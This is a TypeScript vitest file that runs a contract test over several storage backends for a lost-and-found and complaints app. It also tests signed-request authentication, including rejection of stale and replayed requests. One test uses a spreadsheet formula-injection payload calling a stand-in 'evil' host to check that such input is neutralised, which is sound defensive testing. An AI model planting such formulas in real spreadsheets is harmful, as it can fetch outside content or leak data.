import { describe, expect, it } from 'vitest';
import { MemoryStore } from '../src/store/memory';
import type { Store } from '../src/store/types';
import { gasStore } from './helpers';
import { SheetsStore } from '../src/store/sheets';
import { createFakeGoogle } from '../../tests/gcp/fake-google';

const impls: [string, () => Store][] = [
  ['MemoryStore', () => new MemoryStore()],
  ['AppsScriptStore + real Code.gs', () => gasStore().store],
  ['SheetsStore + fake Google APIs', () => new SheetsStore('s', 'b', async () => 't', { fetchImpl: createFakeGoogle().fetchImpl })],
];

describe.each(impls)('Store contract: %s', (_name, make) => {
  it('appends, gets, updates with optimistic versioning', async () => {
    const s = make();
    const [a] = await s.exec([{ op: 'append', table: 'Found_Items', row: { item_id: 'FI-AAAAAAAA', created_at: '2026-01-01T00:00:00Z', status: 'In Storage', item_name: 'Keys', version: '1' } }]);
    expect(a.ok).toBe(true);
    const [g] = await s.exec([{ op: 'get', table: 'Found_Items', value: 'FI-AAAAAAAA' }]);
    expect(g.ok && g.row?.item_name).toBe('Keys');
    const [u] = await s.exec([{ op: 'update', table: 'Found_Items', value: 'FI-AAAAAAAA', patch: { status: 'Matched' }, expectVersion: '1' }]);
    expect(u.ok && u.row?.version).toBe('2');
    const [stale] = await s.exec([{ op: 'update', table: 'Found_Items', value: 'FI-AAAAAAAA', patch: { status: 'Returned' }, expectVersion: '1' }]);
    expect(stale.ok).toBe(false);
    expect(!stale.ok && stale.error).toBe('conflict');
  });

  it('rejects duplicate keys and duplicate unique values (idempotency)', async () => {
    const s = make();
    const row = { complaint_id: 'FB-0000-0001', idempotency_key: 'k1', created_at: '2026-01-01T00:00:00Z' };
    expect((await s.exec([{ op: 'append', table: 'Complaints', row, unique: 'idempotency_key' }]))[0].ok).toBe(true);
    const [dup] = await s.exec([{ op: 'append', table: 'Complaints', row: { ...row, complaint_id: 'FB-0000-0002' }, unique: 'idempotency_key' }]);
    expect(!dup.ok && dup.error).toBe('duplicate');
    expect(!dup.ok && dup.row?.complaint_id).toBe('FB-0000-0001');
    const [dk] = await s.exec([{ op: 'append', table: 'Complaints', row: { ...row, idempotency_key: 'k2' } }]);
    expect(!dk.ok && dk.error).toBe('duplicate_key');
  });

  it('stops a batch at the first failure', async () => {
    const s = make();
    const r = await s.exec([
      { op: 'update', table: 'Complaints', value: 'FB-NOPE-NOPE', patch: { status: 'x' } },
      { op: 'append', table: 'Activity_Log', row: { log_id: 'LG-1', created_at: 'x' } },
    ]);
    expect(r).toHaveLength(1);
    const [logs] = await s.exec([{ op: 'query', table: 'Activity_Log' }]);
    expect(logs.ok && logs.total).toBe(0);
  });

  it('queries with filters, ordering, pagination and column projection', async () => {
    const s = make();
    const ops = Array.from({ length: 30 }, (_, i) => ({
      op: 'append' as const, table: 'Found_Items' as const,
      row: { item_id: `FI-${String(i).padStart(8, '0')}`, created_at: `2026-01-${String(i + 1).padStart(2, '0')}T00:00:00Z`, status: i % 3 === 0 ? 'Returned' : 'In Storage', category: 'Keys' },
    }));
    await s.exec(ops.slice(0, 15));
    await s.exec(ops.slice(15));
    const [q] = await s.exec([{ op: 'query', table: 'Found_Items', where: { status: 'In Storage' }, limit: 5, offset: 5, columns: ['item_id', 'created_at'] }]);
    expect(q.ok && q.total).toBe(20);
    const rows = q.ok ? q.rows! : [];
    expect(rows).toHaveLength(5);
    expect(Object.keys(rows[0])).toEqual(['item_id', 'created_at']);
    expect(rows[0].created_at > rows[1].created_at).toBe(true); // newest first
  });

  it('neutralises spreadsheet formula injection and round-trips the text', async () => {
    const s = make();
    const evil = '=IMPORTXML("http://evil","//a")';
    await s.exec([{ op: 'append', table: 'Activity_Log', row: { log_id: 'LG-X', created_at: '2026', details: evil } }]);
    const [q] = await s.exec([{ op: 'query', table: 'Activity_Log' }]);
    expect(q.ok && q.rows![0].details).toBe(evil);
  });

  it('stores and retrieves files privately', async () => {
    const s = make();
    const id = await s.uploadFile('a.jpg', 'image/jpeg', Buffer.from('hello').toString('base64'));
    const f = await s.getFile(id);
    expect(f?.mime).toBe('image/jpeg');
    expect(Buffer.from(f!.dataBase64, 'base64').toString()).toBe('hello');
    expect(await s.getFile('doesnotexist123')).toBeNull();
  });
});

describe('Apps Script request authentication', () => {
  it('rejects unsigned, badly signed, stale and replayed requests', async () => {
    const { runtime } = gasStore();
    const send = async (env: object) => JSON.parse(await runtime.doPost(JSON.stringify(env)));
    const body = JSON.stringify({ action: 'ping' });
    expect((await send({ ts: Date.now(), nonce: 'n1', body, sig: 'bad' })).error).toBe('unauthorized');
    const crypto = await import('node:crypto');
    const sign = (ts: number, nonce: string) => crypto.createHmac('sha256', runtime.secret).update(`${ts}.${nonce}.${body}`).digest('hex');
    const old = Date.now() - 10 * 60 * 1000;
    expect((await send({ ts: old, nonce: 'n2', body, sig: sign(old, 'n2') })).error).toBe('stale');
    const ts = Date.now();
    expect((await send({ ts, nonce: 'n3', body, sig: sign(ts, 'n3') })).ok).toBe(true);
    expect((await send({ ts, nonce: 'n3', body, sig: sign(ts, 'n3') })).error).toBe('replay');
  });

  it('setup creates all 8 tabs with exact headers', async () => {
    const { runtime } = gasStore();
    const names = [...runtime.sheets.keys()];
    expect(names).toEqual(['Complaints', 'Access_Credentials', 'Found_Items', 'Claim_Requests', 'Complaint_Updates', 'Handover_Records', 'Activity_Log', 'Application_Settings']);
    const { TABLES } = await import('../../shared/domain');
    for (const n of names) expect(runtime.sheets.get(n).data[0]).toEqual([...TABLES[n as keyof typeof TABLES]]);
  });
});
